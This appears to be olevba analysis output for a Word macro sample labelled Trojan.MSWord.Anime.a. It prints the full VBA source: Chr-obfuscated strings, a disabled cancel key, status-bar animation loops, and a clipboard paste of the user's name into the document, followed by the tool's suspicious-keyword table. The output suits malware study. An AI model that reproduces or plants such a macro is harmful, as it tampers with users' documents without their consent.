olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Anime.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Anime.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan.MSWord.Anime.a - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub anime()
Set cb = New DataObject
oi = Chr(32)
Application.EnableCancelKey = wdCancelDisabled
S = Chr(86) + Chr(105) + Chr(99) + Chr(111) + Chr(100) + Chr(105) + Chr(110) + Chr(69) + Chr(83) + oi + oi
Application.Caption = oi + oi + S + Chr(47) + Chr(84) + Chr(78) + Chr(78) + oi + Chr(47) + Chr(67) + Chr(66) + oi + oi
For an = 1 To 3
For x = 1 To 15
yy = S + yy
Application.StatusBar = yy
Call Delay
Next x
For t = 1 To 12
yy = S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next t
For u = 1 To 10
yy = vbTab + S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next u
Next an
yy = S + oi + Chr(45) + Chr(45) + Chr(45) + Chr(62) + oi + yy
For i = 1 To 115
yy = oi + yy
Application.StatusBar = yy
For o = 1 To 400000
Next o
Next i
Application.StatusBar = Chr(62) + Chr(58) + Chr(45) + Chr(41) + yy
Application.Caption = Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName
cb.SetText cr & Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName & cr & cr
cb.PutInClipboard
Selection.Paste
End Sub
Function Delay()
For o = 1 To 1000000
Next o
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

